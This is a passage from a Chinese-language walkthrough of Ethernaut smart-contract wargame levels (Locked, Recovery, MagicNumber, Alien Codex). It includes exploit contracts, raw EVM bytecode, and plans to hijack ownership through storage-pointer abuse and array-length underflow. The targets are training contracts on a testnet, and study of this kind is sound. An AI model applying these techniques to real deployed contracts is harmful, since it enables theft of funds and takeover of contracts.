<span class="comment">// </span></span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> NameRecord) public registeredNameRecord; <span class="comment">// records who registered names </span></span><br><span class="line">    mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> address) public resolve; <span class="comment">// resolves hashes to addresses</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">bytes32 _name, address _mappedAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// set up the new NameRecord</span></span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(unlocked); <span class="comment">// only allow registrations if contract is unlocked</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address instance_addr = <span class="number">0xfce5ca4942678982889e6c9934a2afb02c670098</span>;</span><br><span class="line">    Locked target = Locked(instance_addr);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        target.register(<span class="number">1</span>, tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用 <code>exploit()</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/22.png" alt><br><br></p>
<h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><h2 id="Require-17"><a href="#Require-17" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.</code></li>
<li><code>This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address</code></li>
<li>其实简单来说就是已知一个 <code>Recovery</code> 合约地址，恢复一下它创建的 <code>SimpleToken</code> 地址，然后将 <code>0.5 eth</code> 从丢失地址的合约中提出即可</li>
</ul>
<h2 id="Source-17"><a href="#Source-17" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params">string _name, uint256 _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="keyword">constructor</span>(string _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>&#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address _to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-17"><a href="#Analyse-17" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>区块链上所有信息都是公开的，直接上 <code>ropsten</code> 测试网的官方网页查就可以了</li>
</ul>
<h2 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution"></a>Solution</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ul>
<li>从 <code>console</code> 找到实例地址：<strong>0xd29fcc4b193a576a17af9194d706b17ce5da24e2</strong></li>
<li>通过 <code>ropsten.etherscan.io</code> 找到这个实例的交易信息：<br><a href="https://ropsten.etherscan.io/address/0xd29fcc4b193a576a17af9194d706b17ce5da24e2#internaltx" rel="external nofollow noopener noreferrer" target="_blank">https://ropsten.etherscan.io/address/0xd29fcc4b193a576a17af9194d706b17ce5da24e2#internaltx</a></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/23.png" alt></p>
<ul>
<li>再通过交易信息找到生产合约 <code>lost contract</code> 的地址: <strong>0x77a70a61a077e3aee72404e0e70211bfa72e962b</strong></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/24.png" alt></p>
<ul>
<li>在 <code>remix</code> 部署 <code>SimpleToken</code> ，使用 <code>At address</code> 指定 <code>lost contract</code> 的地址，然后执行 <code>destroy(play_address)</code> 即可</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/25.png" alt></p>
<ul>
<li>查看合约地址可以看到已经被销毁<br><a href="https://ropsten.etherscan.io/address/0x77a70a61a077e3aee72404e0e70211bfa72e962b#internaltx" rel="external nofollow noopener noreferrer" target="_blank">https://ropsten.etherscan.io/address/0x77a70a61a077e3aee72404e0e70211bfa72e962b#internaltx</a></li>
</ul>
<h3 id="一些分析"><a href="#一些分析" class="headerlink" title="一些分析"></a>一些分析</h3><ul>
<li>方法一提交之后，<code>Zeppelin</code> 给出了原理如下：</li>
</ul>
<p id="div-border-left-red">Contract addresses are deterministic and are calculated by <code>keccack256(address, nonce)</code> where the <code>address</code> is the address of the contract (or ethereum address that created the transaction) and <code>nonce</code> is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).<br>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.<br>An interesting <a href="https://swende.se/blog/Ethereum_quirks_and_vulns.html" rel="external nofollow noopener noreferrer" target="_blank">blog</a> post by Martin Swende details potential use cases of this.<br>If you’re going to implement this technique, make sure you don’t miss the nonce, or your funds will be lost forever.</p>

<ul>
<li>原来题目的考点是合约地址可计算，所以这题有两种解法</li>
</ul>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><ul>
<li>参考 <a href="https://www.freebuf.com/articles/blockchain-articles/179662.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.freebuf.com/articles/blockchain-articles/179662.html</a></li>
<li>参考 <a href="https://github.com/ethereum/wiki/wiki/RLP" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ethereum/wiki/wiki/RLP</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rlp_encode</span><span class="params">(input)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(input,str):</span><br><span class="line">        <span class="keyword">if</span> len(input) == <span class="number">1</span> <span class="keyword">and</span> ord(input) &lt; <span class="number">0x80</span>: <span class="keyword">return</span> input</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> encode_length(len(input), <span class="number">0x80</span>) + input</span><br><span class="line">    <span class="keyword">elif</span> isinstance(input,list):</span><br><span class="line">        output = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> input: output += rlp_encode(item)</span><br><span class="line">        <span class="keyword">return</span> encode_length(len(output), <span class="number">0xc0</span>) + output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_length</span><span class="params">(L,offset)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> L &lt; <span class="number">56</span>:</span><br><span class="line">         <span class="keyword">return</span> chr(L + offset)</span><br><span class="line">    <span class="keyword">elif</span> L &lt; <span class="number">256</span>**<span class="number">8</span>:</span><br><span class="line">         BL = to_binary(L)</span><br><span class="line">         <span class="keyword">return</span> chr(len(BL) + offset + <span class="number">55</span>) + BL</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">raise</span> Exception(<span class="string">"input too long"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_binary</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> to_binary(int(x / <span class="number">256</span>)) + chr(x % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> rlp_encode([<span class="string">"d29fcc4b193a576a17af9194d706b17ce5da24e2"</span>.decode(<span class="string">'hex'</span>),<span class="string">"01"</span>.decode(<span class="string">'hex'</span>)]).encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>结果是 <strong>d694d29fcc4b193a576a17af9194d706b17ce5da24e201</strong></li>
<li>拿到 <code>solidity</code> 计算地址</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(keccak256(<span class="number">0xd694d29fcc4b193a576a17af9194d706b17ce5da24e201</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以看到计算的地址和方法一是一样的</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/27.png" alt></p>
<p><br></p>
<h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><h2 id="Require-18"><a href="#Require-18" class="headerlink" title="Require"></a>Require</h2><p id="div-border-left-red">To solve this level, you only need to provide the Ethernaut with a “Solver”, a contract that responds to “whatIsTheMeaningOfLife()” with the right number.<br>Easy right? Well… there’s a catch.<br>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: <strong>10 opcodes at most</strong>.<br>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: <strong>Raw EVM bytecode</strong>.<br>Good luck!</p>

<ul>
<li>题目的意思就是部署一个合约 <code>Solver</code> ，要求在被调用 <code>whatIsTheMeaningOfLife()</code> 函数时返回 <strong>42</strong> 就可以了，但有一个限制是不能超过 <strong>10</strong> 个 <code>opcode</code></li>
</ul>
<h2 id="Source-18"><a href="#Source-18" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-18"><a href="#Analyse-18" class="headerlink" title="Analyse"></a>Analyse</h2><h3 id="多说的话"><a href="#多说的话" class="headerlink" title="多说的话"></a>多说的话</h3><ul>
<li>参考 <a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" rel="external nofollow noopener noreferrer" target="_blank">https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</a></li>
<li>参考 <a href="https://f3real.github.io/Ethernaut_wargame19.html" rel="external nofollow noopener noreferrer" target="_blank">https://f3real.github.io/Ethernaut_wargame19.html</a></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/28.jpeg" alt></p>
<ul>
<li>图片来自于<a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" rel="external nofollow noopener noreferrer" target="_blank">https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</a></li>
</ul>
<p>先看一下 <span id="inline-blue">contract creation</span> 期间会发生什么：<br>1、首先，用户或合约将交易发送到以太网网络。此交易包含数据，但没有 <code>to</code> 地址，表明这是一个合约创建，而不是一个 <code>send/call transaction</code><br>2、其次，<code>EVM</code> 将 <code>Solidity</code>（高级语言）的合约代码编译为 <span id="inline-purple">bytecode</span>（底层的机器语言），该 <span id="inline-purple">bytecode</span> 直接转换为 <span id="inline-green">opcodes</span> ，在单个调用堆栈中运行</p>
<p id="div-border-left-blue">需要注意的是：<span id="inline-blue">contract creation</span> 的 <span id="inline-purple">bytecode</span> 包含两部分：<code>initialization code</code> 和 <code>runtime code</code> </p>

<p>3、在 <span id="inline-blue">contract creation</span> 期间，<code>EVM</code> 仅执行 <code>initialization code</code> 直到到达堆栈中的第一条 <strong>STOP</strong> 或 <strong>RETURN</strong> 指令，在此阶段，合约的 <code>constructor()</code> 会被运行，合约便有地址了</p>
<p id="div-border-left-red">在运行 <code>initialization code</code> 后，只有 <code>runtime code</code> 在堆栈上，然后将这些 <span id="inline-blue">opcode</span> <strong>拷贝</strong> 到 <code>memory</code> 并返回到 <code>EVM</code> </p>

<p>4、最后，<code>EVM</code> 将 <code>runtime code</code> 返回的 <span id="inline-yellow">opcode</span> 存储在 <code>state storage</code> ，并与新的合约地址相关联，在将来对新合约的调用时，这些 <code>runtime code</code> 将被执行</p>
<h3 id="对于该题"><a href="#对于该题" class="headerlink" title="对于该题"></a>对于该题</h3><ul>
<li>所以为了解决该题，我们需要 <code>initialization opcodes</code> 和 <code>runtime codes</code><ul>
<li><code>initialization opcodes</code>: 由 <code>EVM</code> 运行创建合约并存储将来要用的 <code>runtime codes</code></li>
<li><code>runtime codes</code>: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 <strong>return 42</strong> 并且 <strong>under 10 opcodes</strong></li>
</ul>
</li>
</ul>
<p>1、先来看 <code>runtime codes</code> : </p>
<ul>
<li><p>返回值由 <span id="inline-purple">return(p, s)</span> 操作码处理，但是在返回值之前，必须先存储在内存中，使用 <span id="inline-green">mstore(p, v)</span> 将 <strong>42</strong> 存储在内存中</p>
<ul>
<li><p>首先，使用 <span id="inline-green">mstore(p, v)</span> 将 <strong>42</strong> 存储在内存中，其中 <code>p</code> 是在内存中的存储位置， <code>v</code> 是十六进制值，<strong>42</strong> 的十六进制是 <strong>0x2a</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602a     ;PUSH1 0x2a                  v</span><br><span class="line">0x6080     ;PUSH1 0x80                  p</span><br><span class="line">0x52       ;MSTORE</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后，使用 <span id="inline-purple">return(p, s)</span> 返回 <strong>0x2a</strong> ，其中 <code>p</code> 是值 <strong>0x2a</strong> 存储的位置，<code>s</code> 是值 <strong>0x2a</strong> 存储所占的大小 <code>0x20</code> ，占32字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x6020     ;PUSH1 0x20                  s</span><br><span class="line">0x6080     ;PUSH1 0x80                  p</span><br><span class="line">0xf3       ;RETURN</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>所以 <code>runtime codes</code> 应该是 <strong>602a60805260206080f3</strong> ，正好 <strong>10 opcodes</strong></p>
</li>
</ul>
<p>2、再来看 <code>initialization codes</code> :</p>
<ul>
<li><p>首先，<code>initialization codes</code> 需要先将 <code>runtime codes</code> 拷贝到内存，然后再将其返回到 <code>EVM</code> 。将代码从一个地方复制到另一个地方是 <span id="inline-yellow">codecopy(t, f, s)</span> 操作码。<strong>t</strong> 是代码的目标位置，<strong>f</strong> 是 <code>runtime codes</code> 的当前位置，<strong>s</strong> 是代码的大小，以字节为单位，对于 <strong>602a60805260206080f3</strong> 就是 <strong>10 bytes</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;copy bytecode to memory</span><br><span class="line">0x600a     ;PUSH1 0x0a                      S(runtime code size)</span><br><span class="line">0x60??     ;PUSH1 0x??                      F(current position of runtime opcodes)</span><br><span class="line">0x6000     ;PUSH1 0x00                      T(destination memory index 0)</span><br><span class="line">0x39       ;CODECOPY</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后，需要将内存中的 <strong>runtime codes</strong> 返回到 <code>EVM</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;return code from memory to EVM</span><br><span class="line">0x600a     ;PUSH1 0x0a                      S</span><br><span class="line">0x6000     ;PUSH1 0x00                      P</span><br><span class="line">0xf3       ;RETURN</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>initialization codes</code> 总共占了 <strong>0x0c</strong> 字节，这表示 <code>runtime codes</code> 从索引 <strong>0x0c</strong> 开始，所以 <strong>??</strong> 的地方是 <strong>0x0c</strong> </p>
</li>
<li>所以，<code>initialization codes</code> 最后的顺序是 <strong>600a600c600039600a6000f3</strong></li>
</ul>
<p><strong>所以，opcodes最后的顺序是 0x600a600c600039600a6000f3602a60805260206080f3 </strong></p>
<h2 id="Solution-17"><a href="#Solution-17" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bytecode = <span class="string">"0x600a600c600039600a6000f3602a60805260206080f3"</span>;</span><br><span class="line">web3.eth.sendTransaction(&#123; <span class="attr">from</span>: player, <span class="attr">data</span>: bytecode &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err,res</span>)</span>&#123;<span class="built_in">console</span>.log(res)&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>得到<a href="https://ropsten.etherscan.io/tx/0x2e2a636712b37e27af795073a7be6fca9ddfdf964a2356d98c113463c69359ff" rel="external nofollow noopener noreferrer" target="_blank">https://ropsten.etherscan.io/tx/0x2e2a636712b37e27af795073a7be6fca9ddfdf964a2356d98c113463c69359ff</a>，点击查看如下，得到 <code>Contract address</code> 为 <strong>0x7baa1861df4eff11ff258e657bff2420be19b564</strong></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/29.png" alt></p>
<ul>
<li>调用题目合约 <strong>setsolver(“0x7baa1861df4eff11ff258e657bff2420be19b564”)</strong> 即可</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/30.png" alt><br><br></p>
<h1 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h1><h2 id="Require-19"><a href="#Require-19" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>You&#39;ve uncovered an Alien contract. Claim ownership to complete the level.</code></li>
</ul>
<h2 id="Source-19"><a href="#Source-19" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params">bytes32[] _firstContactMessage</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    assert(_firstContactMessage.length &gt; <span class="number">2</span>**<span class="number">200</span>);</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params">bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-19"><a href="#Analyse-19" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>合约开头 <code>import</code> 了 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/ownership/Ownable.sol" rel="external nofollow noopener noreferrer" target="_blank">Ownable.sol</a> 合约，同时也引入了一个 <span id="inline-blue">owner</span> 变量</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;<span class="built_in">console</span>.info(y)&#125;);</span><br><span class="line"><span class="comment">// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>其中 <strong>owner = 0x73048cec9010e92c298b016966bde1cc47299df5</strong> ，<strong>contract = 0x0</strong>，这是由于 <code>EVM</code> 存储优化的关系，可以参考 <a href="https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage" rel="external nofollow noopener noreferrer" target="_blank">https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage</a> 并且数组 <span id="inline-purple">codex</span> 的 <code>slot</code> 为 <code>1</code> ，同时这也是存储数组 <strong>length</strong> 的地方，而 <span id="inline-purple">codex</span> 的实际内容存储在 <code>keccak256(bytes32(1))</code> 开始的位置</p>
<ul>
<li><code>Keccak256</code> 是紧密打包的，意思是说参数不会补位，多个参数也会直接连接在一起，所以要用 <code>keccak256(bytes32(1))</code></li>
<li>参考 <a href="https://www.freebuf.com/articles/blockchain-articles/177260.html" rel="external nofollow noopener noreferrer" target="_blank">Solidity中各种变量的存储方式</a></li>
</ul>
</li>
<li><p>这样我们就知道了 <span id="inline-purple">codex</span> 实际的存储的 <code>slot</code> ，可以将动态数组内变量的存储位计算方法概括为: <code>array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index)</code>. 因为总共有 <strong>2^256</strong> 个 <code>slot</code> ，要修改 <strong>slot 0</strong> ，假设 <span id="inline-purple">codex</span> 实际所在 <code>slot x</code> ，(对于本题来说，数组的 <code>slot</code>是 <code>1</code> , x=keccak256(bytes32(1))) ，那么当我们修改 <strong>codex[y],(y=2^256-x+0)</strong> 时就能修改 <strong>slot 0</strong> ，从而修改 <span id="inline-blue">owner</span> </p>
<ul>
<li>我们要修改 <strong>codex[y]</strong> ，那就要满足 <code>y &lt; codex.length</code> ，而这个时候 <strong>codex.length =0</strong> ，但是我们可以通过 <strong>retract()</strong> 使 <code>length</code> 下溢，然后就可以操纵 <strong>codex[y]</strong> 了</li>
</ul>
